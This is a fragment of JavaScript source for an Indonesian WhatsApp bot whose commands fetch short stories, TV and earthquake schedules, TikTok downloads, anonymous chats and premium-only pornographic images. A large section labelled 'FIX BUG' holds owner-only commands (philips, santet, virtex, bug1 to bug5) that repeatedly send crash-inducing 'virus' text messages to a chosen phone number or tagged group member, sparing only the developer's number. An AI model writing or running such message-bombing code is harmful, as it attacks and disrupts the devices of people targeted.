            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-motivasi":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`motivasi`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-nasihat":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`nasihat`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-nasionalisme":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`nasionalisme`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-olahraga":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`olahraga`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-patahhati":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`patah hati`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-penantian":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`penantian`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-pendidikan":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`pendidikan`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-pengalaman":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`pengalaman pribadi`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-pengorbanan":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`pengorbanan`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-penyesalan":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`penyesalan`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-perjuangan":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`perjuangan`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-perpisahan":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`perpisahan`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-persahabatan":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`persahabatan`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-petualangan":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`petualangan`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-ramadhan":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`ramadhan`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-remaja":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`remaja`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-rindu":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`rindu`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-rohani":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`rohani`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-romantis":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`romantis`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-sastra":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`sastra`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-sedih":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`sedih`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "cerpen-sejarah":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          let cerpe = await cerpen(`sejarah`);
          reply(
            `⭔ _*Title :*_ ${cerpe.title}\n⭔ _*Author :*_ ${cerpe.author}\n⭔ _*Category :*_ ${cerpe.kategori}\n⭔ _*Pass Moderation :*_ ${cerpe.lolos}\n⭔ _*Story :*_\n${cerpe.cerita}`
          );
        }
        break;
      case "hentai":
      case "ahegao":
      case "ass":
      case "bdsm":
      case "cuckold":
      case "cum":
      case "ero":
      case "femdom":
      case "foot":
      case "gangbang":
      case "glasses":
      case "jahy":
      case "masturbation":
      case "orgy":
      case "panties":
      case "pussy":
      case "thighs":
      case "yuri":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem);
          let cndn = await fetchJson(
            `https://raw.githubusercontent.com/jepribarus/JB-Api/main/nsfw/${command}.json`
          );
          let random = cndn[Math.floor(Math.random() * cndn.length)];
          conn.sendMessage(
            m.chat,
            { image: { url: random }, caption: `Nih Kak` },
            { quoted: fakekirbotz }
          );
        }
        break;
      case "jadibot":
        {
          if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
          if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem);
          if (isGroup) return reply("Gunakan bot di privat chat");
          jadibot(conn, msg, from);
        }
        break;
      case "listjadibot":
        if (cekUser("id", sender) == null) return reply(mess.OnlyUser);
        if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem);
        if (isGroup) return reply("Gunakan bot di privat chat");
        try {
          let user = [
            ...new Set([
              ...global.conns
                .filter((conn) => conn.user)
                .map((conn) => conn.user),
            ]),
          ];
          te = "*List Jadibot*\n\n";
          for (let i of user) {
            let y = await conn.decodeJid(i.id);
            te += " × User : @" + y.split("@")[0] + "\n";
            te += " × Name : " + i.name + "\n\n";
          }
          conn.sendMessage(from, { text: te, mentions: [y] }, { quoted: msg });
        } catch (err) {
          reply(`Belum Ada User Yang Jadibot`);
        }
        break;
      case "jadwaltv":
        {
          if (!q) return reply(`Contoh : #${command} Rcti`);
          let tivi = await jadwalTV(q);
          let texoy = `Jadwal TV ${tivi.channel}\n\n`;
          for (let i of tivi.result) {
            texoy += `Tanggal : ${i.date}\n`;
            texoy += `Acara :${i.event}\n\n`;
          }
          reply(texoy);
        }
        break;
      case "gempa":
        let gempaaa = await gempa();
        let gempanyy = "*INFO GEMPA*\n";
        for (let i of gempaaa) {
          gempanyy += `Tanggal : ${i.date}\nKordinat : ${i.locate}\nMagnitude :${i.magnitude}\nLokasi ${i.location}\nDaerah bahaya :${i.warning}\n\n`;
        }
        reply(gempanyy);
        break;
      case "gempanow":
        {
          let gemp = await gempaNow();
          let texih = "GEMPA-NOW\n\n";
          for (let i of gemp) {
            texih += `Tanggal : ${i.date}
latitude : ${i.latitude} 
longitude : ${i.longitude} 
Magnitude :${i.magnitude}
Lokasi ${i.location}
Kedalaman :${i.depth}\n\n`;
          }
          reply(texih);
        }
        break;
      case "bioskopnow":
        {
          let skop = await bioskopNow();
          let storee = "❉─────────────────────❉\n";
          for (let i of skop) {
            storee += `\n*「 *JADWAL BIOSKOP NOW* 」*\n
- *Judul* : ${i.title}
- *Link* : ${i.url}\n
- *Genre* : ${i.genre}
- *Durasi* : ${i.duration}
- *Tayang di* : ${i.playingAt}\n❉─────────────────────❉`;
            reply(storee);
          }
        }
        break;
      case "latintoaksara":
        {
          if (!q) return reply(`Contoh : #${command} Makan bang`);
          let uios = await latinToAksara(q);
          reply(uios);
        }
        break;
      case "aksaratolatin":
        {
          if (!q) return reply(`Contoh : #${command} ꦪꦺꦴꦲꦺꦴ`);
          let uios = await aksaraToLatin(q);
          reply(uios);
        }
        break;

      // FIX BUG
      case "sendbug":
      case "philips":
        {
          if (!isOwner) return reply(mess.OnlyOwner);
          if (!q)
            return reply(
              `Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`
            );
          var num = q + "@s.whatsapp.net";
          var dev = "6283834558105@s.whatsapp.net";
          if (num == dev) return reply("Itu developer gua");
          if (num == sender) return reply("Itu Nomor Lu Sendiri");
          await sleep(3000);
          conn.sendMessage(num, { text: philips }, { quoted: virusnya });
          await sleep(3000);
          mentions(`Sukses kirim philips to @${num.split("@")[0]}`, [num]);
        }
        break;
      case "philips2":
        {
          if (!isOwner) return reply(mess.OnlyOwner);
          if (!q)
            return reply(
              `Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`
            );
          var num = q + "@s.whatsapp.net";
          var dev = "6283834558105@s.whatsapp.net";
          if (num == dev) return reply("Itu developer gua");
          if (num == sender) return reply("Itu Nomor Lu Sendiri");
          await sleep(3000);
          conn.sendMessage(num, { text: philips }, { quoted: virusnya });
          await sleep(3000);
          conn.sendMessage(num, { text: philips }, { quoted: virusnya });
          await sleep(3000);
          mentions(`Sukses kirim *${command}* to @${num.split("@")[0]}`, [num]);
        }
        break;
      case "philips3":
        {
          if (!isOwner) return reply(mess.OnlyOwner);
          if (!q)
            return reply(
              `Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`
            );
          var num = q + "@s.whatsapp.net";
          var dev = "6283834558105@s.whatsapp.net";
          if (num == dev) return reply("Itu developer gua");
          if (num == sender) return reply("Itu Nomor Lu Sendiri");
          conn.sendMessage(num, { text: philips }, { quoted: virusnya });
          await sleep(3000);
          conn.sendMessage(num, { text: philips }, { quoted: virusnya });
          await sleep(3000);
          conn.sendMessage(num, { text: philips }, { quoted: virusnya });
          await sleep(3000);
          mentions(`Sukses kirim *${command}* to @${num.split("@")[0]}`, [num]);
        }
        break;
      case "santet":
        {
          if (!isOwner) return reply(mess.OnlyOwner);
          if (!isGroup) return reply(mess.OnlyGrup);
          var number;
          if (mentionUser.length !== 0) {
            number = mentionUser[0];
            await sleep(3000);
            conn.sendMessage(number, { text: philips }, { quoted: virusnya });
            mentions(`Sukses kirim *${command}* to @${number.split("@")[0]}`, [
              number,
            ]);
          } else if (isQuotedMsg) {
            number = quotedMsg.sender;
            await sleep(3000);
            conn.sendMessage(number, { text: philips }, { quoted: virusnya });
            mentions(`Sukses kirim *${command}* to @${number.split("@")[0]}`, [
              number,
            ]);
          } else {
            reply(
              "Tag atau reply orang yg mau santet\n\n*Contoh:* #santet @tag"
            );
          }
        }
        break;
      case "santet2":
        {
          if (!isOwner) return reply(mess.OnlyOwner);
          if (!isGroup) return reply(mess.OnlyGrup);
          var number;
          if (mentionUser.length !== 0) {
            number = mentionUser[0];
            await sleep(3000);
            conn.sendMessage(number, { text: philips }, { quoted: virusnya });
            await sleep(3000);
            conn.sendMessage(number, { text: philips }, { quoted: virusnya });
            mentions(`Sukses kirim *${command}* to @${number.split("@")[0]}`, [
              number,
            ]);
          } else if (isQuotedMsg) {
            number = quotedMsg.sender;
            await sleep(3000);
            conn.sendMessage(number, { text: philips }, { quoted: virusnya });
            await sleep(3000);
            conn.sendMessage(number, { text: philips }, { quoted: virusnya });
            mentions(`Sukses kirim *${command}* to @${number.split("@")[0]}`, [
              number,
            ]);
          } else {
            reply(
              "Tag atau reply orang yg mau santet\n\n*Contoh:* #santet @tag"
            );
          }
        }
        break;
      case "santet3":
        {
          if (!isOwner) return reply(mess.OnlyOwner);
          if (!isGroup) return reply(mess.OnlyGrup);
          var number;
          if (mentionUser.length !== 0) {
            number = mentionUser[0];
            await sleep(3000);
            conn.sendMessage(number, { text: philips }, { quoted: virusnya });
            await sleep(3000);
            conn.sendMessage(number, { text: philips }, { quoted: virusnya });
            await sleep(3000);
            conn.sendMessage(number, { text: philips }, { quoted: virusnya });
            mentions(`Sukses kirim *${command}* to @${number.split("@")[0]}`, [
              number,
            ]);
          } else if (isQuotedMsg) {
            number = quotedMsg.sender;
            await sleep(3000);
            conn.sendMessage(number, { text: philips }, { quoted: virusnya });
            await sleep(3000);
            conn.sendMessage(number, { text: philips }, { quoted: virusnya });
            await sleep(3000);
            conn.sendMessage(number, { text: philips }, { quoted: virusnya });
            mentions(`Sukses kirim *${command}* to @${number.split("@")[0]}`, [
              number,
            ]);
          } else {
            reply(
              "Tag atau reply orang yg mau santet\n\n*Contoh:* #santet @tag"
            );
          }
        }
        break;
      case "virtex":
        {
          if (!isOwner) return reply(mess.OnlyOwner);
          if (!q)
            return reply(
              `Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`
            );
          var num = q + "@s.whatsapp.net";
          var dev = "6283834558105@s.whatsapp.net";
          if (num == dev) return reply("Itu developer gua");
          if (num == sender) return reply("itu nomor lu sendiri");
          conn.sendMessage(num, { text: virus }, { quoted: virusnya });
          await sleep(3000);
          mentions(`Sukses kirim *${command}* to @${num.split("@")[0]}`, [num]);
        }
        break;
      case "virtex2":
        {
          if (!isOwner) return reply(mess.OnlyOwner);
          if (!q)
            return reply(
              `Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`
            );
          var num = q + "@s.whatsapp.net";
          var dev = "6283834558105@s.whatsapp.net";
          if (num == dev) return reply("Itu developer gua");
          if (num == sender) return reply("itu nomor lu sendiri");
          conn.sendMessage(num, { text: virus }, { quoted: virusnya });
          await sleep(3000);
          conn.sendMessage(num, { text: virus }, { quoted: virusnya });
          await sleep(3000);
          mentions(`Sukses kirim *${command}* to @${num.split("@")[0]}`, [num]);
        }
        break;
      case "virtex3":
        {
          if (!isOwner) return reply(mess.OnlyOwner);
          if (!q)
            return reply(
              `Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`
            );
          var num = q + "@s.whatsapp.net";
          var dev = "6283834558105@s.whatsapp.net";
          if (num == dev) return reply("Itu developer gua");
          if (num == sender) return reply("itu nomor lu sendiri");
          conn.sendMessage(num, { text: virus }, { quoted: virusnya });
          await sleep(3000);
          conn.sendMessage(num, { text: virus }, { quoted: virusnya });
          await sleep(3000);
          conn.sendMessage(num, { text: virus }, { quoted: virusnya });
          await sleep(3000);
          mentions(`Sukses kirim *${command}* to @${num.split("@")[0]}`, [num]);
        }
        break;
      case "bug1":
        {
          if (!isOwner) return reply(mess.OnlyOwner);
          if (!q)
            return reply(
              `Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`
            );
          var num = q + "@s.whatsapp.net";
          var dev = "6283834558105@s.whatsapp.net";
          if (num == dev) return reply("Itu developer gua");
          if (num == sender) return reply("itu nomor lu sendiri");
          conn.sendMessage(num, { text: "p" }, { quoted: virusnya });
          await sleep(3000);
          mentions(`Sukses kirim *${command}* to @${num.split("@")[0]}`, [num]);
        }
        break;
      case "bug2":
        {
          if (!isOwner) return reply(mess.OnlyOwner);
          if (!q)
            return reply(
              `Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`
            );
          var num = q + "@s.whatsapp.net";
          var dev = "6283834558105@s.whatsapp.net";
          if (num == dev) return reply("Itu developer gua");
          if (num == sender) return reply("itu nomor lu sendiri");
          conn.sendMessage(num, { text: "p" }, { quoted: virusnya });
          await sleep(3000);
          mentions(`Sukses kirim *${command}* to @${num.split("@")[0]}`, [num]);
        }
        break;
      case "bug3":
        {
          if (!isOwner) return reply(mess.OnlyOwner);
          if (!q)
            return reply(
              `Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`
            );
          var num = q + "@s.whatsapp.net";
          var dev = "6283834558105@s.whatsapp.net";
          if (num == dev) return reply("Itu developer gua");
          if (num == sender) return reply("itu nomor lu sendiri");
          conn.sendMessage(num, { text: "p" }, { quoted: virusnya });
          conn.sendMessage(num, { text: virus }, { quoted: virusnya });
          conn.sendMessage(num, { text: "p" }, { quoted: virusnya });
          await sleep(3000);
          mentions(`Sukses kirim *${command}* to @${num.split("@")[0]}`, [num]);
        }
        break;
      case "bug4":
        {
          if (!isOwner) return reply(mess.OnlyOwner);
          if (!q)
            return reply(
              `Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`
            );
          var num = q + "@s.whatsapp.net";
          var dev = "6283834558105@s.whatsapp.net";
          if (num == dev) return reply("Itu developer gua");
          if (num == sender) return reply("itu nomor lu sendiri");
          await sleep(3000);
          conn.sendMessage(num, { text: "p" }, { quoted: virusnya });
          await sleep(3000);
          conn.sendMessage(num, { text: "p" }, { quoted: virusnya });
          await sleep(3000);
          conn.sendMessage(num, { text: virus }, { quoted: virusnya });
          await sleep(3000);
          conn.sendMessage(num, { text: virus }, { quoted: virusnya });
          await sleep(3000);
          mentions(`Sukses kirim *${command}* to @${num.split("@")[0]}`, [num]);
        }
        break;
      case "bug5":
        {
          if (!isOwner) return reply(mess.OnlyOwner);
          if (!q)
            return reply(
              `Syntak Error!\n*Contoh:*\n${prefix + command} 628xxx`
            );
          var num = q + "@s.whatsapp.net";
          var dev = "6283834558105@s.whatsapp.net";
          if (num == dev) return reply("Itu developer gua");
          if (num == sender) return reply("itu nomor lu sendiri");
          await sleep(3000);
          conn.sendMessage(num, { text: "p" }, { quoted: virusnya });
          await sleep(3000);
          conn.sendMessage(num, { text: virus }, { quoted: virusnya });
          await sleep(3000);
          conn.sendMessage(num, { text: "p" }, { quoted: virusnya });
          await sleep(3000);
          conn.sendMessage(num, { text: "p" }, { quoted: virusnya });
          await sleep(3000);
          conn.sendMessage(num, { text: virus }, { quoted: virusnya });
          await sleep(3000);
          mentions(`Sukses kirim *${command}* to @${num.split("@")[0]}`, [num]);
        }
        break;
      case "tiktok":
        {
          if (!q)
            return reply("contoh :\n#tiktok https://vt.tiktok.com/ZSRG695C8/");
          reply(mess.wait);
          fetchJson(
            `https://saipulanuar.ga/api/download/tiktok2?url=${q}&apikey=dyJhXvqe`
          )
            .then((tt_res) => {
              reply(`𝗧𝗜𝗞𝗧𝗢𝗞 𝗗𝗢𝗪𝗡𝗟𝗢𝗔𝗗

𝘼𝙪𝙩𝙝𝙤𝙧: Lexxy Official
𝙅𝙪𝙙𝙪𝙡: ${tt_res.result.judul}
𝙎𝙤𝙪𝙧𝙘𝙚: ${q}

Video sedang dikirim...`);
              conn.sendMessage(
                from,
                {
                  video: { url: tt_res.result.video.link2 },
                  caption: "No Watermark!",
                },
                { quotes: msg }
              );
            })
            .catch((err) => {
              reply("Terjadi Kesalahan!!\nUrl tidak valid");
            });
        }
        break;
      case "bales_room":
        {
          var id_satu = q.split("|")[0];
          var id_dua = q.split("|")[1];
          db_menfes.push({ id: id_satu, teman: id_dua });
          db_menfes.push({ teman: id_satu, id: id_dua });
          fs.writeFileSync(
            "./database/menfess.json",
            JSON.stringify(db_menfes, 2, null)
          );
          conn.sendMessage(id_dua, { text: "Tulis 1 pesan yg ingin dibalas" });
        }
        break;
      default:
        if (!isCmd) {
          if (cekPesan("id", sender) == null) return;
          if (cekPesan("teman", sender) == false) return;
          if (
            m.messages[0].type == "conversation" ||
            m.messages[0].type == "extendedTextMessage"
          ) {
            try {
              var chat_anonymous =
                m.messages[0].message.extendedTextMessage.text;
            } catch (err) {
              var chat_anonymous = m.messages[0].message.conversation;
            }
            var aku = cekPesan("teman", sender);
            let text_menfess = `𝗔𝗡𝗢𝗡𝗬𝗠𝗢𝗨𝗦 𝗖𝗛𝗔𝗧
💬 : ${chat_anonymous}`;
            let btn_menfes = [
              {
                buttonId: `${prefix}stopchat ${cekPesan(
                  "id",
                  sender
                )}|${cekPesan("teman", sender)}`,
                buttonText: { displayText: "⋮☰ STOP" },
                type: 1,
              },
            ];
            var button_menfess = {
              text: text_menfess,
              footer: "Klik button untuk stop.",
              buttons: btn_menfes,
              headerType: 1,
            };
            conn.sendMessage(cekPesan("teman", sender), button_menfess);
            fs.writeFileSync(
              "./database/menfess.json",
              JSON.stringify(db_menfes, null, 1)
            );
          }
        }
    }
  } catch (err) {
    console.log(color("[ERROR]", "red"), err);
    server_eror.push({ error: `${err}` });
    fs.writeFileSync("./database/func_error.json", JSON.stringify(server_eror));
  }
};
